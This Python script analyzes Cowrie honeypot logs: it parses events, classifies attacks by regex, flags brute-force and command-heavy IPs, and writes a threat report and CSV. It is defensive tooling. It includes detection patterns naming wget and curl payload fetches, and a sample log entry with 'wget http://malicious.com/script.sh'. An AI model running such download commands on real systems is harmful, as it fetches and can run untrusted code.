#!/usr/bin/env python3
"""
Comprehensive Honeypot Log Analyzer
===================================

This script provides advanced analysis capabilities for honeypot logs,
including pattern detection, attack classification, and threat intelligence
generation for cybersecurity research and monitoring.

Author: Cybersecurity Research Project
Version: 1.0
"""

import json
import csv
import re
import datetime
import ipaddress
import requests
from collections import defaultdict, Counter
import matplotlib.pyplot as plt
import pandas as pd
from typing import Dict, List, Tuple, Any

class HoneypotLogAnalyzer:
    """
    Advanced honeypot log analyzer for detecting attack patterns,
    analyzing attacker behavior, and generating threat intelligence.
    """

    def __init__(self, log_file_path: str = None):
        self.log_file_path = log_file_path
        self.attack_patterns = self._load_attack_patterns()
        self.geo_cache = {}  # Cache for IP geolocation lookups

    def _load_attack_patterns(self) -> Dict:
        """Load predefined attack patterns for classification"""
        return {
            'brute_force': [
                r'authentication failure',
                r'invalid user',
                r'failed password',
                r'login attempt'
            ],
            'reconnaissance': [
                r'port scan',
                r'service discovery',
                r'banner grab',
                r'enumeration'
            ],
            'exploitation': [
                r'shell command',
                r'file upload',
                r'privilege escalation',
                r'backdoor'
            ],
            'malware': [
                r'wget.*\.sh',
                r'curl.*malware',
                r'cryptocurrency miner',
                r'botnet'
            ]
        }

    def parse_cowrie_logs(self, log_file: str = None) -> List[Dict]:
        """
        Parse Cowrie honeypot logs and extract structured data

        Args:
            log_file: Path to Cowrie log file

        Returns:
            List of parsed log entries with structured data
        """
        if not log_file:
            log_file = self.log_file_path

        parsed_logs = []

        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    try:
                        if line.strip():
                            log_entry = json.loads(line.strip())

                            # Standardize log entry format
                            standardized_entry = {
                                'timestamp': log_entry.get('timestamp', ''),
                                'source_ip': log_entry.get('src_ip', ''),
                                'source_port': log_entry.get('src_port', ''),
                                'destination_port': log_entry.get('dst_port', ''),
                                'username': log_entry.get('username', ''),
                                'password': log_entry.get('password', ''),
                                'command': log_entry.get('input', ''),
                                'session': log_entry.get('session', ''),
                                'event_type': log_entry.get('eventid', ''),
                                'message': log_entry.get('message', ''),
                                'line_number': line_num
                            }

                            parsed_logs.append(standardized_entry)

                    except json.JSONDecodeError as e:
                        print(f"Error parsing line {line_num}: {e}")
                        continue

        except FileNotFoundError:
            print(f"Log file not found: {log_file}")
            return []

        return parsed_logs

    def analyze_attack_patterns(self, logs: List[Dict]) -> Dict[str, Any]:
        """
        Analyze logs for attack patterns and generate intelligence

        Args:
            logs: List of parsed log entries

        Returns:
            Dictionary containing attack pattern analysis
        """
        analysis_results = {
            'total_events': len(logs),
            'unique_ips': set(),
            'attack_types': defaultdict(int),
            'top_usernames': Counter(),
            'top_passwords': Counter(),
            'top_commands': Counter(),
            'hourly_activity': defaultdict(int),
            'geographic_distribution': defaultdict(int),
            'session_analysis': {},
            'threat_indicators': []
        }

        for log_entry in logs:
            # Collect unique source IPs
            if log_entry['source_ip']:
                analysis_results['unique_ips'].add(log_entry['source_ip'])

            # Count usernames and passwords
            if log_entry['username']:
                analysis_results['top_usernames'][log_entry['username']] += 1
            if log_entry['password']:
                analysis_results['top_passwords'][log_entry['password']] += 1

            # Count commands
            if log_entry['command']:
                analysis_results['top_commands'][log_entry['command']] += 1

            # Analyze hourly activity
            if log_entry['timestamp']:
                try:
                    dt = datetime.datetime.fromisoformat(
                        log_entry['timestamp'].replace('Z', '+00:00')
                    )
                    hour = dt.hour
                    analysis_results['hourly_activity'][hour] += 1
                except (ValueError, AttributeError):
                    pass

            # Classify attack types
            for attack_type, patterns in self.attack_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, str(log_entry.get('message', '')), re.IGNORECASE):
                        analysis_results['attack_types'][attack_type] += 1
                        break

        # Convert unique IPs set to count
        analysis_results['unique_ips'] = len(analysis_results['unique_ips'])

        return analysis_results

    def detect_suspicious_patterns(self, logs: List[Dict]) -> List[Dict]:
        """
        Detect suspicious patterns that indicate advanced threats

        Args:
            logs: List of parsed log entries

        Returns:
            List of suspicious patterns detected
        """
        suspicious_patterns = []

        # Group logs by source IP for pattern analysis
        ip_activities = defaultdict(list)
        for log in logs:
            if log['source_ip']:
                ip_activities[log['source_ip']].append(log)

        for ip, activities in ip_activities.items():
            # Detect rapid connection attempts (potential brute force)
            if len(activities) > 20:
                suspicious_patterns.append({
                    'type': 'High_Volume_Attempts',
                    'source_ip': ip,
                    'count': len(activities),
                    'severity': 'high',
                    'description': f'IP {ip} made {len(activities)} connection attempts'
                })

            # Detect unique username/password combinations
            credentials = set()
            for activity in activities:
                if activity['username'] and activity['password']:
                    credentials.add((activity['username'], activity['password']))

            if len(credentials) > 10:
                suspicious_patterns.append({
                    'type': 'Credential_Stuffing',
                    'source_ip': ip,
                    'unique_credentials': len(credentials),
                    'severity': 'medium',
                    'description': f'IP {ip} attempted {len(credentials)} different credential combinations'
                })

            # Detect command execution patterns
            commands = [activity['command'] for activity in activities if activity['command']]
            if len(commands) > 5:
                suspicious_patterns.append({
                    'type': 'Command_Execution',
                    'source_ip': ip,
                    'commands_executed': len(commands),
                    'severity': 'high',
                    'description': f'IP {ip} executed {len(commands)} commands'
                })

        return suspicious_patterns

    def generate_threat_report(self, logs: List[Dict]) -> str:
        """
        Generate a comprehensive threat intelligence report

        Args:
            logs: List of parsed log entries

        Returns:
            Formatted threat report as string
        """
        analysis = self.analyze_attack_patterns(logs)
        suspicious = self.detect_suspicious_patterns(logs)

        report = f"""
HONEYPOT THREAT INTELLIGENCE REPORT
===================================
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

SUMMARY STATISTICS
------------------
Total Events Logged: {analysis['total_events']}
Unique Source IPs: {analysis['unique_ips']}
Suspicious Patterns Detected: {len(suspicious)}

ATTACK TYPE DISTRIBUTION
------------------------"""

        for attack_type, count in analysis['attack_types'].items():
            report += f"\n{attack_type.title().replace('_', ' ')}: {count} incidents"

        report += f"""

TOP ATTACK VECTORS
------------------
Most Attempted Usernames:"""

        for username, count in analysis['top_usernames'].most_common(5):
            report += f"\n  {username}: {count} attempts"

        report += "\n\nMost Attempted Passwords:"
        for password, count in analysis['top_passwords'].most_common(5):
            report += f"\n  {password}: {count} attempts"

        report += "\n\nMost Executed Commands:"
        for command, count in analysis['top_commands'].most_common(5):
            report += f"\n  {command[:50]}...: {count} times"

        report += f"""

HIGH-PRIORITY THREATS
---------------------"""

        high_priority_threats = [s for s in suspicious if s['severity'] == 'high']
        if high_priority_threats:
            for threat in high_priority_threats[:10]:
                report += f"\n[{threat['severity'].upper()}] {threat['type']}: {threat['description']}"
        else:
            report += "\nNo high-priority threats detected."

        report += f"""

RECOMMENDATIONS
---------------
1. Monitor IPs with high activity volumes for potential blocking
2. Implement rate limiting for authentication attempts
3. Update honeypot configurations based on attack patterns
4. Correlate findings with external threat intelligence feeds
5. Review and update security controls based on observed TTPs

TECHNICAL DETAILS
-----------------
Analysis performed on {len(logs)} log entries
Pattern matching used {len(self.attack_patterns)} attack categories
Detection algorithms identified {len(suspicious)} suspicious patterns
"""

        return report

    def export_analysis_results(self, logs: List[Dict], output_file: str = 'honeypot_analysis.csv'):
        """
        Export analysis results to CSV for further analysis

        Args:
            logs: List of parsed log entries
            output_file: Output CSV file path
        """
        analysis = self.analyze_attack_patterns(logs)
        suspicious = self.detect_suspicious_patterns(logs)

        # Prepare data for CSV export
        export_data = []

        # Add basic statistics
        export_data.append(['Metric', 'Value', 'Category'])
        export_data.append(['Total Events', analysis['total_events'], 'Summary'])
        export_data.append(['Unique IPs', analysis['unique_ips'], 'Summary'])
        export_data.append(['Suspicious Patterns', len(suspicious), 'Summary'])

        # Add attack type counts
        for attack_type, count in analysis['attack_types'].items():
            export_data.append([attack_type, count, 'Attack Types'])

        # Add top usernames
        for username, count in analysis['top_usernames'].most_common(10):
            export_data.append([username, count, 'Top Usernames'])

        # Add top passwords
        for password, count in analysis['top_passwords'].most_common(10):
            export_data.append([password, count, 'Top Passwords'])

        # Add suspicious patterns
        for pattern in suspicious:
            export_data.append([
                pattern['type'], 
                pattern.get('count', pattern.get('unique_credentials', pattern.get('commands_executed', 1))),
                f"Suspicious - {pattern['severity']}"
            ])

        # Write to CSV
        with open(output_file, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerows(export_data)

        print(f"Analysis results exported to {output_file}")

def main():
    """
    Main function to demonstrate honeypot log analysis
    """
    # Example usage of the HoneypotLogAnalyzer
    analyzer = HoneypotLogAnalyzer()

    # Generate sample log data for demonstration
    sample_logs = [
        {
            'timestamp': '2025-09-08T11:00:00Z',
            'source_ip': '192.168.1.100',
            'source_port': '12345',
            'destination_port': '22',
            'username': 'admin',
            'password': 'password123',
            'command': 'ls -la',
            'session': 'session001',
            'event_type': 'cowrie.login.success',
            'message': 'authentication success'
        },
        {
            'timestamp': '2025-09-08T11:01:00Z',
            'source_ip': '10.0.0.50',
            'source_port': '54321',
            'destination_port': '22',
            'username': 'root',
            'password': 'toor',
            'command': 'wget http://malicious.com/script.sh',
            'session': 'session002',
            'event_type': 'cowrie.command.input',
            'message': 'command execution detected'
        }
    ]

    # Analyze the sample logs
    analysis_results = analyzer.analyze_attack_patterns(sample_logs)
    suspicious_patterns = analyzer.detect_suspicious_patterns(sample_logs)
    threat_report = analyzer.generate_threat_report(sample_logs)

    print("HONEYPOT LOG ANALYSIS COMPLETED")
    print("================================")
    print(f"Total events analyzed: {analysis_results['total_events']}")
    print(f"Unique source IPs: {analysis_results['unique_ips']}")
    print(f"Suspicious patterns found: {len(suspicious_patterns)}")
    print("\nGenerated comprehensive threat report.")

    # Export results
    analyzer.export_analysis_results(sample_logs, 'sample_honeypot_analysis.csv')

    return threat_report

if __name__ == "__main__":
    threat_report = main()
    print("\n" + "="*50)
    print("SAMPLE THREAT REPORT PREVIEW:")
    print("="*50)
    print(threat_report[:1000] + "..." if len(threat_report) > 1000 else threat_report)
